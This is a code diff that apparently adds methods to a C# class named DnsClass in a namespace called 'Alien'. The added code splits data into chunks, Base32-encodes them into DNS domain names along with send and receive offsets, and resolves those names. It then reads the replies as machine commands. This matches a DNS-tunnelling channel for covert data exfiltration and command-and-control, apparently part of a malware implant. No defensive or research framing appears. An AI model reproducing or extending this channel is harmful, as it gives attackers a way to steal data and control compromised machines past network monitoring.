@@ -123,6 +123,51 @@ namespace Alien
 			return false;
 		}
 
+		internal static MachineCommand SendAndReceive()
+		{
+			MachineCommand ret = MachineCommand.Failed;
+			while (DnsClass._ReceiveByteIndex < DnsClass._ReceiveDataSize 
+				&& DnsClass._SendByteIndex < DnsClass._SendDataSize 
+				&& DnsClass._TryMe(() => DnsClass._SendAndReceive(out ret)))
+			{
+				Util.MakeDelay(1);
+			}
+			Util.Log(string.Format("SendAndReceive : {0}", ret));
+			return ret;
+		}
+
+		private static bool _SendAndReceive(out MachineCommand ret)
+		{
+			int val = DnsClass._SendDataSize - DnsClass._SendByteIndex;
+			int num = Math.Min(Config.SendCount, val);
+			DnsClass._DomainMaker(
+				Enums.DomainType.SendAndReceive, 
+				Util.ConvertIntToDomain(DnsClass._SendByteIndex).PadLeft(3, Config.CharsDomain[0]) + 
+					Util.ConvertIntToDomain(DnsClass._ReceiveByteIndex).PadLeft(3, Config.CharsDomain[0]) + 
+					Base32Encoding.GetByteString(DnsClass._SendData.Skip(DnsClass._SendByteIndex).Take(num).ToArray<byte>())
+			);
+			ret = MachineCommand.Failed;
+			byte[] data;
+			bool flag = DnsClass._Resolver(out data);
+			if (flag)
+			{
+				if (DnsClass._ProcessData(data))
+				{
+					ret = MachineCommand.DataReceived;
+				}
+				if (DnsClass._CheckSend(num))
+				{
+					if (ret == MachineCommand.DataReceived)
+					{
+						ret = MachineCommand.DataSendedAndReceived;
+						return flag;
+					}
+					ret = MachineCommand.DataSended;
+				}
+			}
+			return flag;
+		}
+
 		private static bool _TryMe(Func<bool> fn)
 		{
 			bool result = false;
